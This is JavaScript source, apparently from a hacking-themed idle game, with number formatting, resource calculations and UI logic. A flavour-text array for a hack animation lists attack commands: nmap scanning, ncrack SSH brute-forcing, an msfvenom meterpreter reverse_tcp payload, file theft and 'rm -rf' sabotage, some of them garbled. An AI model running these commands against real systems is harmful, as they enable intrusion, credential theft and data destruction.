"p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"],
simpleNumberLeft = 1,
simpleNumberRight,

//achievements menu
aoldsel,
anewsel,

//bot menu
bot_old = "suppoer_1",
bot_new = "suppoer_1",
bot_mene_old = "warehouse",
bot_mene_new = "warehouse",
bot_assign_old = "scrapping1",
bot_assign_new = "scrapping1",

//zoom in/out forman menu
format_zoom = 1,

hack_animation_start = 0,
atkType = 1,
attack_difficulty = 0,
tW_ctr = 0,
tW_ctr_id = 0,
hack_txt = ['#!/bin/bash<br>', 
	'TARGET_IP="192.168.1.100"<br>',
	'echo "Checking for incoming attacks..."',
	'etstat -nap | grep -i SYN<br>', 
	'echo "Blocking known attacking IP addresses..."',
	'iptables -I INPUT -s $ATTACKING_IP -j DROP<br>',
	'echo "Enabling firewall to protect against further attacks..."',
	'ufw enable<br>',
	'echo "Scanning target system for open ports..."',
	'nmap -p- -T4 $TARGET_IP<br>', 
	'echo "Brute-forcing login credentials using ncrack..."',
	'ncrack -v --user [USERNAME] -P [PASSWORD_FILE] ssh://$TARGET_IP<br>',
	'echo "Escalating privileges to gain root access..."',
	'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=4444 -f elf > shell.elf./shell.elf<br>',
	'echo "Searching for desired files on target system..."',
	'search=$(cat desired_files.txt)cd /find . -name "$search"<br>',
	'echo "Downloading desired files from target system..."',
	'download /[PATH_TO_DESIRED_FILES] [LOCAL_DIRECTORY]<br>',
	'echo "Sabotaging targets data..."',
	'rm -rf [LOCAL_DIRECTORY]/*<br>',
	'echo "Covering tracks and exiting target system..."',
	'exit'];

if (!String.prototype.padStart) {
  String.prototype.padStart = function padStart(targetLength, padString) {
    targetLength = targetLength >> 0 //truncate if number or convert non-number to 0
    padString = String(padString || ' ')
    if (this.length > targetLength) {
      return String(this)
    }
    else {
      targetLength = targetLength - this.length
      if (targetLength > padString.length) {
        padString += padString.repeat(targetLength / padString.length) //append to original to ensure we are longer than needed
      }
      return padString.slice(0, targetLength) + String(this)
    }
  }
}

function setArrayTimeout(callback, delay) {
  var timeoutId = setTimeout(function() {
    callback()
    remove_timeoutID(timeoutId)
  }, delay)
  
  timers_IDs.push(timeoutId)

  return timeoutId
 }

function remove_timeoutID(id) {
	var index = timers_IDs.indexOf(id)
	if (index > -1)
		timers_IDs.splice(index, 1)
}

//simple precision solution, it just does what i need
function preciseNumber(num1, num2, operator, digit) {
	result = 0
	if(operator == "+") 
		result = Number((num1+num2).toFixed(digit))
	else if(operator == "-")
		result = Number((num1-num2).toFixed(digit))
	else if(operator == "*")
		result = Number((num1*num2).toFixed(digit))
	else if(operator == "/")
		result = Number((num1/num2).toFixed(digit))

	return result
}

function simplifyNumberSmall(num) {
	return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",")
}

function simplifyNumber(number) {	
	if(number < 1000000)
    	return number.toLocaleString()
  else {
  	let exNum
  	let numstr = number.toString()
  	if(number >= 1e21) {
  		exNum = parseInt(numstr.split('+')[1])
  		numstr = number.toLocaleString('fullwide', {useGrouping:false})
  	}
  	else {
  		exNum = parseInt(number.toExponential().split('+')[1])
  	}
  	let numMod = exNum % 3
  	let numSlic = numstr.slice(0, 4+numMod)
     	number = numSlic.replace(/\B(?=(\d{3})+(?!\d))/g, ".")
  	if(parseInt(exNum/3) == 2)
  		number = number + "M"
  	else if(parseInt(exNum/3) == 3)
  		number = number + "B"
  	else if(parseInt(exNum/3) == 4)
  		number = number + "T"
  	else if(parseInt(exNum/3) == 5)
  		number = number + "Q"
  	else {
  		let x = parseInt(exNum/3-5)
  		exNum -= 18
  		simpleNumberLeft = parseInt(exNum/78+1);
  		simpleNumberRight = x % 26
  		if(x % 26 == 0) {
  			simpleNumberRight = 26
  		}
  		number = number+simpleNumberL[simpleNumberLeft]+simpleNumberL[simpleNumberRight]
  	}
  	return number
  }
}

function get_connection_speed_with_symbol(value) {
	let symbol = "",
	num = 0;
	if(value < 1024) {symbol = "b"; num = value;}
	else if(value < 1048576) {symbol="Kb"; num=value/1024;}
	else if(value < 1073741824) {symbol="Mb"; num=value/1048576;}
	else if(value < 1099511627776) {symbol="Gb"; num=value/1073741824;}
	else if(value < 1125899906842624) {symbol="Tb"; num=value/1099511627776;}
	num = num.toFixed(3)
	return num+symbol
}


//tims as seconds, return string "00h:00m:00s"
function formatTime(seconds) {
  // Calculate the number of years, days, hours, minutes, and seconds
  var years = Math.floor(seconds / (365 * 24 * 3600))
  var days = Math.floor((seconds % (365 * 24 * 3600)) / (24 * 3600))
  var hours = Math.floor((seconds % (24 * 3600)) / 3600)
  var minutes = Math.floor((seconds % 3600) / 60)
  var remainingSeconds = Math.floor(seconds % 60)

  // Check if the time is greater than 365 days
  if (years > 0) {
    // Check if the number of years is less than 99
    if (years < 99) {
      return (
        addLeadingZeros(years, 2) + 'y:' +
        addLeadingZeros(days, 2) + 'd:' +
        addLeadingZeros(hours, 2) + 'h'
      );
    } else {
      return (
        '000y:' +
        addLeadingZeros(days, 2) + 'd:' +
        addLeadingZeros(hours, 2) + 'h'
      );
    }
  }

  // Check if the time is greater than 24 hours
  if (days > 0) {
    return (
      addLeadingZeros(days, 2) + 'd:' +
      addLeadingZeros(hours, 2) + 'h:' +
      addLeadingZeros(minutes, 2) + 'm'
    );
  }

  // Format the time as a string '00h:00m:00s'
  return (
    addLeadingZeros(hours, 2) + 'h:' +
    addLeadingZeros(minutes, 2) + 'm:' +
    addLeadingZeros(remainingSeconds, 2) + 's'
  );
}

function formatTimeMinute(timeInSeconds) {
  // Calculate the minutes and seconds
  var minutes = Math.floor(timeInSeconds / 60)
  var seconds = timeInSeconds % 60

  // Format the minutes and seconds with leading zeros
  var formattedMinutes = addLeadingZeros(minutes, 2)
  var formattedSeconds = addLeadingZeros(seconds, 2)

  // Return the formatted time
  return `${formattedMinutes}m:${formattedSeconds}s`
}

function addLeadingZeros(num, length) {
  var str = num.toString()
  while (str.length < length) {
    str = '0' + str
  }
  return str
}

//recursive deep copy of an Object
function deepCopy(obj) {
  if (obj instanceof Map) {
    const newMap = new Map()
    obj.forEach((value, key) => {
      newMap.set(key, deepCopy(value))
    })
    return newMap;
  } else if (typeof obj !== 'object' || obj === null) {
    // If obj is not an object, return it as is
    return obj
  }

  // Create a new object or array based on the type of the input object
  const newObj = Array.isArray(obj) ? [] : {}

  // Recursively copy each property of the input object
  for (let key in obj) {
    newObj[key] = deepCopy(obj[key])
  }

  return newObj
}

function weightedRandom(max, min) {
	return Math.round(max / (Math.random() * max + min))
}

//max inclucded max = 100 >> 100 not 99
function ranged_random(max, min) {
	return Math.floor(Math.random()*((max+1)-min)+min)
}

//log in console
function log(str, type) {
	$("#log_text").text("")

	if(cnsl_all.length >= 80)
		cnsl_all.shift()
	cnsl_all.push(str)
	cnsl_all[0] = cnsl_all[0].replace("<br>", "")

	for (let i = 0; i < cnsl_all.length; i++) {
		$("#log_text").append(cnsl_all[i])
	}
	/*
	switch(type) {
		case "sys":
			if(cnsl_sys.length >= 60)
				cnsl_sys.shift()
			cnsl_sys.push(str)
			cnsl_sys[0] = cnsl_sys[0].replace("<br>", "")
			break
		case "hq":
			if(cnsl_hq.length >= 60)
				cnsl_hq.shift()
			cnsl_hq.push(str)
			cnsl_hq[0] = cnsl_hq[0].replace("<br>", "")
			break
		case "gaia":
			if(cnsl_gaia.length >= 60)
				cnsl_gaia.shift()
			cnsl_gaia.push(str)
			cnsl_gaia[0] = cnsl_gaia[0].replace("<br>", "")
			break
		default:
			break
	}

	switch(Game.permanent.console_filter) {
		case "cnsl_sys":
			for (let i = 0; i < cnsl_sys.length; i++) {
					$("#log_text").append(cnsl_sys[i])
			}
			break;
		case "cnsl_hq":
			for (let i = 0; i < cnsl_hq.length; i++) {
					$("#log_text").append(cnsl_hq[i])
			}
			break;
		case "cnsl_gaia":
			for (let i = 0; i < cnsl_gaia.length; i++) {
					$("#log_text").append(cnsl_gaia[i])
			}
			break
		default:
			for (let i = 0; i < cnsl_all.length; i++) {
					$("#log_text").append(cnsl_all[i])
			}
			break
	}*/

	$("#log_text").scrollTop($("#log_text").prop("scrollHeight"))
	$("#achievements_info_card").css("display", "none")
}

function increase_credit(value) {
	Game.impermanent.credit += value
	Game.permanent.total_credit_generated += value
	total_credit_in_one_session += value
	idle_credit  += value
	t = simplifyNumber(Game.impermanent.credit)
	$("#cNum").text(t)
	Observer["CREDIT_INCREASE"]()

	if(Game.permanent.total_credit_generated > Math.pow(temp_format_cps_multi+1, 3) * 50000000){
		temp_format_cps_multi = Math.floor(Math.pow(Game.permanent.total_credit_generated / 50000000, 1/3))
	}
	$("#format_n_cps").text("Next: +"+simplifyNumber(Math.floor(temp_format_cps_multi-Game.permanent.format_cps_multi*100))+"%")
	if(h_s_nsel == "h_section")
		check_h_item_price()
	else
		check_s_item_price()
	if(newmenu == "store_btn") {
		if(snewsel == "hq_btn") 
			check_hqStore_item_price()
		else if(snewsel == "ol_btn") {
			check_onlineStore_item_price()
		}
	}

	if(Game.permanent.auto_install && Game.impermanent.software_in_list.length > 0)
		auto_install_softwares()
}

function decrease_credit(value) {
	Game.impermanent.credit -= value
	if(Game.impermanent.credit < 0) {
		Game.impermanent.credit = 0
	}
	Game.permanent.total_credit_spent += value
	t = simplifyNumber(Game.impermanent.credit)
	$("#cNum").text(t)
	Observer["CREDIT_DECREASE"]()
	if(h_s_nsel == "h_section")
		check_h_item_price()
	else
		check_s_item_price()
	if(newmenu == "store_menu") {
		if(snewsel == "hq_btn")
			check_hqStore_item_price()
		else if(snewsel == "ol_btn") 
			check_onlineStore_item_price()
	}
}
//for any loasing credit mechanics
function decrease_credit_with_no_track(value) {
	Game.impermanent.credit -= value
	if(Game.impermanent.credit < 0) {
		Game.impermanent.credit = 0
	}
	$("#cNum").text(simplifyNumber(Game.impermanent.credit))
	if(h_s_nsel == "h_section")
		check_h_item_price()
	else
		check_s_item_price()
	if(newmenu == "store_menu") {
		if(snewsel == "hq_btn")
			check_hqStore_item_price()
		else if(snewsel == "ol_btn") 
			check_onlineStore_item_price()
	}
}

//with Observer and other(when added)
function increase_data(value) {
	Game.permanent.data += value
	Game.permanent.total_data += value
	total_data_in_one_session += value
	idle_data += value
	data_with_symbol = get_data_with_symbol(Game.permanent.data, 3)
	$("#dNum").text(data_with_symbol)
	
	if(newmenu == "format_btn") {
		checK_node_price()
		$("#format_dps_text").text(get_data_with_symbol(Game.permanent.data, 3))
	}
	Observer["DATA_INCREASE"]()
}

function increase_data_no_track(value) {
	Game.permanent.data += value
	data_with_symbol = get_data_with_symbol(Game.permanent.data, 3)
	$("#dNum").text(data_with_symbol)
	if(newmenu == "format_btn") {
		checK_node_price()
		$("#format_dps_text").text(get_data_with_symbol(Game.permanent.data, 3))
	}
}

function get_data_with_symbol(value, float) {
	let symbol = "",
	num = 0;
	if(value < 1024) {symbol = "B"; num = value;}
	else if(value < 1048576) {symbol="KB"; num=value/1024;}
	else if(value < 1073741824) {symbol="MB"; num=value/1048576;}
	else if(value < 1099511627776) {symbol="GB"; num=value/1073741824;}
	else if(value < 1125899906842624) {symbol="TB"; num=value/1099511627776;}
	else if(value < 1152921504606846976) {symbol="PB"; num=value/1125899906842624;}
	else if(value < 1180591620717411303424) {symbol="EB"; num=value/1152921504606846976;}
	else if(value < 1208925819614629174706176) {symbol="ZB"; num=value/1180591620717411303424;}
	else if(value < 1237940039285380274899124224) {symbol="YB"; num=value/1208925819614629174706176;}
	else if(value < 1267650600228229401496703205376) {symbol="RB"; num=value/1237940039285380274899124224;}
	else if(value < 1298074214633706907132624082305024) {symbol="QB"; num=value/1267650600228229401496703205376;}
	num = num.toFixed(float)
	num = num.replace(/\.000/g, "")
	return num+symbol
}

//with Observer and other (when added)
function decrease_data(value) {
	Game.permanent.data -= value
	if(Game.permanent.data < 0) {
		Game.permanent.data = 0
	}
	data_with_symbol = get_data_with_symbol(Game.permanent.data, 3)
	$("#dNum").text(data_with_symbol)
	//udate in format menu
	$("#data_format").text(data_with_symbol)
	if(newmenu == "format_btn") {
		checK_node_price()
		$("#format_dps_text").text(get_data_with_symbol(Game.permanent.data, 3))
	}
}
//without Observer
function decrease_data_no_track(value) {
	Game.permanent.data -= value
	if(Game.permanent.data < 0) {
		Game.permanent.data = 0
	}
	data_with_symbol = get_data_with_symbol(Game.permanent.data, 3)
	$("#dNum").text(data_with_symbol)
	//udate in format menu
	$("#data_format").text(data_with_symbol)
	if(newmenu == "format_btn") {
		checK_node_price()
		$("#format_dps_text").text(get_data_with_symbol(Game.permanent.data, 3))
	}
}

function increase_time(value) {
	time += value * 1000
	idle_time++
	session_time++
  time_diff = (new Date().getTime() - start) - time
  Game.permanent.total_time_played += value

  Observer["MISCELLANEOUS"]["TIME_PLAYED"]()
}

function crown_coin() {
	//reduce time
	Game.impermanent.current_crown_cycle--
	if(Game.impermanent.current_crown_cycle <= 0) {
		coin = $("#crown_coin")
		coin.removeClass("crown_coin_anim")
		coin.outerHeight() //trggier reflow
		coin.addClass("crown_coin_anim")
		//set random duration
		crown_coin_duration = Math.floor(45*(1+Game.impermanent.crown_effect_duration_multi))
		//reset cycle
		Game.impermanent.current_crown_cycle = Math.floor((ranged_random(900, 300)*(1-Game.impermanent.crown_cycle_multi))+crown_coin_duration) //90(15min)-300(5min), 1-1.1 = 0.9 = crown_cycle_multi which will decrease cycle, aka apearance frequancy

		//set poistion
		coin.css({
			"display": "block",
			"z-index": 1000,
			'animation-duration': (15*(1+Game.impermanent.crown_coin_visibility_appearance))+'s',
			"top": ranged_random($(window).height()-coin.height()*2, coin.height()*2),
			"left": ranged_random($(window).width()-coin.width()*2, coin.width()*2)
		})
	}
}

//string, CSS root variable
function con_span(text, color) {
	return "<span style='color: "+color+";'>"+text+"</span>"
}

//calculate all rsources when installing(buying) new items
function CalResources() {
	//reset
	hard_cpu_con = 0
	hard_gpu_con = 0
	hard_ram_con = 0
	hard_heat_con = 0
	soft_cpu_con = 0
	soft_gpu_con = 0
	soft_ram_con = 0
	soft_heat_con = 0
	//cal hardware consumption
	for(let item in hardwares) {
		hard_cpu_con += hardwares[item].cpu*Game.impermanent.hardware_count[item]
		hard_gpu_con += hardwares[item].gpu*Game.impermanent.hardware_count[item]
		hard_ram_con += hardwares[item].ram*Game.impermanent.hardware_count[item]
		hard_heat_con += hardwares[item].heat*Game.impermanent.hardware_count[item]
	}
	//cal software consumption
	for (const [key, value] of Game.impermanent.unlocked_software) {
		if(value == true) {
			soft_cpu_con += softwares[key].cpu
			soft_gpu_con += softwares[key].gpu
			soft_ram_con += softwares[key].ram
			soft_heat_con += softwares[key].heat
		}
	}

	//cal displayed values
	total_cpu_inc = hq_cpu_inc+Game.impermanent.ol_cpu_inc
	total_cpu_con = base_cpu+hard_cpu_con+soft_cpu_con+hq_cpu_con+Game.impermanent.ol_cpu_con
	total_gpu_inc = hq_gpu_inc+Game.impermanent.ol_gpu_inc
	total_gpu_con = base_gpu+hard_gpu_con+soft_gpu_con+hq_gpu_con+Game.impermanent.ol_gpu_con
	total_ram_inc = base_ram+hq_ram_inc+Game.impermanent.ol_ram_inc
	total_ram_con = hard_ram_con+soft_ram_con+hq_ram_con+Game.impermanent.ol_ram_con
	total_heat_inc = hq_heat_inc+Game.impermanent.ol_heat_inc
	total_heat_con = base_heat+hard_heat_con+soft_heat_con+hq_heat_con+Game.impermanent.ol_heat_con
	cpuU = total_cpu_con-total_cpu_inc
	gpuU = total_gpu_con-total_gpu_inc
	ramU = total_ram_con+total_ram_inc
	heatMU = total_heat_con-total_heat_inc

	//cal dps
	Game.impermanent.dps_total_multi = 1+(Game.impermanent.dps_filtering_multi*Game.impermanent.ol["Filtering"].multi)+
	(Game.impermanent.dps_analysis_multi*Game.impermanent.ol["Analysis"].multi)+(Game.impermanent.dps_sorting_multi*Game.impermanent.ol["Sorting"].multi)
	base_dps = 1*Game.impermanent.dps_multi_thread
	dps = base_dps*(Game.impermanent.dps_multi*Game.impermanent.ol.Data.multi)*Game.impermanent.dps_total_multi*Game.impermanent.g_eff.coin_data*Game.impermanent.g_eff.ad_data

	//cal other
	//add all cps multi + achievement multi
	Game.impermanent.total_multi = (((Game.impermanent.computing*Game.impermanent.ol.Computing.multi)+(Game.impermanent.frequency*Game.impermanent.ol.Frequency.multi)+
		(Game.impermanent.and_gate*Game.impermanent.ol["AND Gate"].multi)+(Game.impermanent.or_gate*Game.impermanent.ol["OR Gate"].multi)+
		(Game.impermanent.not_gate*Game.impermanent.ol["NOT Gate"].multi)+(Game.impermanent.nand_gate*Game.impermanent.ol["NAND Gate"].multi)+
		(Game.impermanent.nor_gate*Game.impermanent.ol["NOT Gate"].multi)+(Game.impermanent.xor_gate*Game.impermanent.ol["XOR Gate"].multi)+
		(Game.impermanent.nxor_gate*Game.impermanent.ol["NXOR Gate"].multi)+1)*(Game.permanent.achievementsMulti+Game.permanent.format_cps_multi+1))*Game.impermanent.ol.Credit.multi

	keyboard_cps = hardwares.h1.eff*Game.impermanent.keyboardMulti*Game.impermanent.ol.Keyboard.multi*
		(1+Game.permanent.keyboard_Mode*(Game.impermanent.total_hardware-Game.impermanent.hardware_count.h1)+
			Game.permanent.keyboard_conversion/100*Game.impermanent.hardware_count.h3)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit
	

	mouse_cps = hardwares.h2.eff*Game.impermanent.mouseMulti*Game.impermanent.ol.Mouse.multi*
		(1+Game.permanent.mouse_Mode*Game.impermanent.hardware_count.h1+
			Game.permanent.mouse_conversion/100*Game.impermanent.hardware_count.h4)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit

	chair_cps = hardwares.h3.eff*Game.impermanent.chairMulti*Game.impermanent.ol.Chair.multi*
		(1+Game.permanent.chair_Mode*Game.impermanent.hardware_count.h2+
			Game.permanent.chair_conversion/100*Game.impermanent.hardware_count.h5+
			Game.permanent.keyboard_conversion/500*Game.impermanent.hardware_count.h1)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit

	desk_cps = hardwares.h4.eff*Game.impermanent.deskMulti*Game.impermanent.ol.Desk.multi*
		(1+Game.permanent.desk_Mode*Game.impermanent.hardware_count.h3+
			Game.permanent.desk_conversion/100*Game.impermanent.hardware_count.h6+
			Game.permanent.mouse_conversion/500*Game.impermanent.hardware_count.h2)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit

	monitor_cps = hardwares.h5.eff*Game.impermanent.monitorMulti*Game.impermanent.ol.Monitor.multi*
		(1+Game.permanent.monitor_Mode*Game.impermanent.hardware_count.h4+
			Game.permanent.monitor_conversion/100*Game.impermanent.hardware_count.h7+
			Game.permanent.chair_conversion/500*Game.impermanent.hardware_count.h3)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit

	router_cps = hardwares.h6.eff*Game.impermanent.routerMulti*Game.impermanent.ol.Router.multi*
		(1+Game.permanent.router_Mode*Game.impermanent.hardware_count.h5+
			Game.permanent.router_conversion/100*Game.impermanent.hardware_count.h8+
			Game.permanent.desk_conversion/500*Game.impermanent.hardware_count.h4)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit

	pc_cps = hardwares.h7.eff*Game.impermanent.pcMulti*Game.impermanent.ol.PC.multi*
		(1+Game.permanent.pc_Mode*Game.impermanent.hardware_count.h6+
			Game.permanent.pc_conversion/100*Game.impermanent.hardware_count.h9+
			Game.permanent.monitor_conversion/500*Game.impermanent.hardware_count.h5)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit

	solar_cps = hardwares.h8.eff*Game.impermanent.solarMulti*Game.impermanent.ol["Solar power"].multi*
		(1+Game.permanent.solar_power_Mode*Game.impermanent.hardware_count.h7+
			Game.permanent.solar_power_conversion/100*Game.impermanent.hardware_count.h10+
			Game.permanent.router_conversion/500*Game.impermanent.hardware_count.h6)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit

	mag_gen_cps = hardwares.h9.eff*Game.impermanent.mag_genMulti*Game.impermanent.ol.Generator.multi*
		(1+Game.permanent.magnetic_generator_Mode*Game.impermanent.hardware_count.h8+
			Game.permanent.magnetic_generator_conversion/100*Game.impermanent.hardware_count.h11+
			Game.permanent.pc_conversion/500*Game.impermanent.hardware_count.h7)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit

	radio_tower_cps = hardwares.h10.eff*Game.impermanent.radio_tower_Multi*Game.impermanent.ol["Radio tower"].multi*
		(1+Game.permanent.radio_tower_Mode*Game.impermanent.hardware_count.h9+
			Game.permanent.solar_power_conversion/500*Game.impermanent.hardware_count.h8)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit

	radar_dish_cps = hardwares.h11.eff*Game.impermanent.radar_dish_Multi*Game.impermanent.ol["Radar dish"].multi*
		(1+Game.permanent.radar_dish_Mode*Game.impermanent.hardware_count.h10+
			Game.permanent.magnetic_generator_conversion/500*Game.impermanent.hardware_count.h9)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit

	satellite_cps = hardwares.h12.eff*Game.impermanent.satellite_Multi*Game.impermanent.ol.Satellite.multi*
		(1+Game.permanent.satellite_Mode*Game.impermanent.hardware_count.h11+
			Game.permanent.radio_tower_conversion/500*Game.impermanent.hardware_count.h10)*Game.impermanent.total_multi*Game.impermanent.g_eff.coin_credit*Game.impermanent.g_eff.ad_credit*Game.impermanent.g_eff.gaia_credit

	cps = (keyboard_cps*Game.impermanent.hardware_count.h1)+(mouse_cps*Game.impermanent.hardware_count.h2)+
		(chair_cps*Game.impermanent.hardware_count.h3)+(desk_cps*Game.impermanent.hardware_count.h4)+(monitor_cps*Game.impermanent.hardware_count.h5)+
		(router_cps*Game.impermanent.hardware_count.h6)+(pc_cps*Game.impermanent.hardware_count.h7)+(solar_cps*Game.impermanent.hardware_count.h8)+
		(mag_gen_cps*Game.impermanent.hardware_count.h9)+(radio_tower_cps*Game.impermanent.hardware_count.h10)+(radar_dish_cps*Game.impermanent.hardware_count.h11)+
		(satellite_cps*Game.impermanent.hardware_count.h12)

	cal_bot()

	dps += bm_stat.auto_pressing_data_inc+bm_stat.auto_addition_data_inc+bm_stat.auto_sequencer_data_inc+bm_stat.network_listener_inc
	dps *= 1-(cpu_eff/100)
	dps *= Game.impermanent.g_eff.gaia_data

	cps += bm_stat.auto_pressing_credit_inc+bm_stat.auto_addition_credit_inc+bm_stat.auto_sequencer_credit_inc


	Observer["MISCELLANEOUS"]["H_CPS"]()
	Observer["MISCELLANEOUS"]["H_DPS"]()
	cps *= 1-(gpu_eff/100)
	click_total = ((click_base*Game.impermanent.click_multi+(Game.impermanent.clicktinuum*Game.impermanent.hardware_count.h2/100)*cps)*Game.impermanent.ol.Click.multi+(cps*Game.impermanent.click_add*Game.impermanent.ol["Click mode"].multi))*Game.impermanent.g_eff.coin_click*Game.impermanent.g_eff.gaia_click

	//to recal auto clicker after bacause cpc depends on cps
	bm_stat.auto_clicker_inc = click_total*preciseNumber(bm_stat.auto_clicker_effect, 100, "/", 3)
	$("#auto_clicker_eff_n_txt").text("+"+get_procedure_effect("auto_clicker"))

	//cal nps
	nps = Game.impermanent.hardware_count.h6 > 0 ? (131072+Game.impermanent.hardware_count.h6*8192)*Game.impermanent.g_eff.gaia_network:0;//base 128KB, it will be div by 8 to Simulate Kb

	update_main_resouces()
	$("#cpc").text("CPC: "+simplifyNumber(click_total))
}

function create_svg(lvl, img_id, parent) {
	if(lvl == undefined || lvl == null) 
		$("#"+parent).append('<svg class="lv'+0+'_icon"><use xlink:href="#'+img_id+'"></use></svg>')
	else
		$("#"+parent).append('<svg class="lv'+lvl+'_icon"><use xlink:href="#'+img_id+'"></use></svg>')
}


function check_ram_space(consumption, amount) {
	if(ramU + (consumption*amount) >= 0) 
		return true
	else {
		Events["RAM_0"]()
		return false
	} 
}

function check_threat() {
	if(Game.impermanent.threat >= 100) {
		//stop game, clear all current timeouts
		stop_game()

		$("#format_btn").click()
		
		$("#menus_sel_locked").css("display", "block")
		$("#tasks_section_locked").css("display", "block")
		$("#g_eff_timer_locked").css("display", "block")
		$("#console_locked").css("display", "block")
		$("#quick_info_locked").css("display", "block")
		$("#h_s_container_locked").css("display", "block")
		$("#format_dps").css("display", "flex")
		$("#format_dps_text").text(get_data_with_symbol(Game.permanent.data, 3))
		
		opne_makesure('forced_frmt')
	}
}

function remove_view_multi_state(id) {
	$("#"+Game.impermanent.g_eff.effects[id].visual_id).removeClass("animated_crown1 animated_crown2 animated_crown3 animated_crown4")
	$("#g_eff_icon > use").attr('xlink:href', "")
	$("#gaia_sobatage_timer_bg").css("box-shadow", "none")
}

function set_view_multi_state() {
	for(i = 0; i < Game.impermanent.g_eff.effects.length; i++) {
		$("#"+Game.impermanent.g_eff.effects[i].visual_id).removeClass("animated_crown1 animated_crown2 animated_crown3 animated_crown4")
		$("#g_eff_icon > use").attr('xlink:href', "")
		$("#gaia_sobatage_timer_bg").css("box-shadow", "none")
		//set animation color
		if(Game.impermanent.g_eff.effects[i].icone_id == "coin") {
			$("#g_eff_icon > use").attr('xlink:href', "#coin")
			$("#gaia_sobatage_timer_bg").css("box-shadow", "inset 0px 0px 15px var(--golden)")
			$("#"+Game.impermanent.g_eff.effects[i].visual_id).css("color", "var(--golden")
		}
		else if(Game.impermanent.g_eff.effects[i].icone_id == "eclipse") {
			$("#g_eff_icon > use").attr('xlink:href', "#eclipse")
			$("#gaia_sobatage_timer_bg").css("box-shadow", "inset 0px 0px 15px var(--negativeClr)")
			$("#"+Game.impermanent.g_eff.effects[i].visual_id).css("color", "var(--negativeClr")
		}
		else {
			$("#g_eff_icon > use").attr('xlink:href', "#play")
			$("#gaia_sobatage_timer_bg").css("box-shadow", "inset 0px 0px 15px var(--mainClr)")
			$("#"+Game.impermanent.g_eff.effects[i].visual_id).css("color", "var(--mainClr")
		}

		//set animation level
		if(Game.impermanent.g_eff[Game.impermanent.g_eff.effects[i].multi_name] == "ad_credit" || 
				Game.impermanent.g_eff[Game.impermanent.g_eff.effects[i].multi_name] == "ad_data") {
			if(Game.impermanent.g_eff[Game.impermanent.g_eff.effects[i].multi_name] == 2)
				$("#"+Game.impermanent.g_eff.effects[i].visual_id).addClass("animated_crown1")
			else if(Game.impermanent.g_eff[Game.impermanent.g_eff.effects[i].multi_name] == 4)
				$("#"+Game.impermanent.g_eff.effects[i].visual_id).addClass("animated_crown2")
			else if(Game.impermanent.g_eff[Game.impermanent.g_eff.effects[i].multi_name] == 8)
				$("#"+Game.impermanent.g_eff.effects[i].visual_id).addClass("animated_crown4")
		}
		else {
			if(Game.impermanent.g_eff[Game.impermanent.g_eff.effects[i].effect] < 0.25)
				$("#"+Game.impermanent.g_eff.effects[i].visual_id).addClass("animated_crown1")
			else if(Game.impermanent.g_eff[Game.impermanent.g_eff.effects[i].effect] < 0.5)
				$("#"+Game.impermanent.g_eff.effects[i].visual_id).addClass("animated_crown2")
			else if(Game.impermanent.g_eff[Game.impermanent.g_eff.effects[i].effect] < 0.75)
				$("#"+Game.impermanent.g_eff.effects[i].visual_id).addClass("animated_crown3")
			else 
			$("#"+Game.impermanent.g_eff.effects[i].visual_id).addClass("animated_crown4")
		}
	}
}

function onhover_g_eff() {
	des = ""
	elm = $("#effects_card_text")
	elm.empty()
	if(Game.impermanent.g_eff.effects.length > 0)
		for(i = 0; i < Game.impermanent.g_eff.effects.length; i++) {
			des = Game.impermanent.g_eff.effects[i].des.replace("/e", formatTimeMinute(Game.impermanent.g_eff.effects[i].time))
			elm.append("<p>"+des+"</p>")
			if(i != Game.impermanent.g_eff.effects.length-1)
				elm.append("<div class='horizontal_line'></div>")
		}
	else
		elm.append("No effects currently active")
}

function start_game() {
	isLogin = true
	$("#main_manu_view").css({
		display: "none"
	})
	$("#export_text").val("")
	start = new Date().getTime()
	old_clock = start
	Observer["TASKS"]["PRESS"]()
	Observer["TASKS"]["ADD"]()
	Observer["TASKS"]["SEQUENCE"]()

	//=============format tree============
	setDragScroll()
	reset_format_effects()
	set_nodes_effects()
	set_format_tree_brightenss()
	$("#format_c_cps").text("CPS bonus: "+simplifyNumber(Game.permanent.format_cps_multi*100)+"%")
	temp_format_cps_multi = Game.permanent.format_cps_multi*100
	$("#format_n_cps").text("Next: +0%")
	//====================================

	//=============Quick info============
	$("#cNum").text(simplifyNumber(Game.impermanent.credit))
	$("#dNum").text(get_data_with_symbol(Game.permanent.data, 3))
	$("#mNum").text(simplifyNumber(Game.permanent.materials))
	hq_cpu_inc = Game.impermanent.hq_cpu*(10+Game.permanent.resources)
	hq_gpu_inc = Game.impermanent.hq_gpu*(10+Game.permanent.resources)
	hq_ram_inc = Game.impermanent.hq_ram*(8+Game.permanent.resources)
	hq_heat_inc = Game.impermanent.hq_heat*(10+Game.permanent.resources)
	//====================================

	CalResources()

	//==========system manager==========
	set_processes_apps_table()
	set_processes_bg_table()
	update_processes_resources_title()
	create_sys_software_icons()
	update_details()
	//===================================

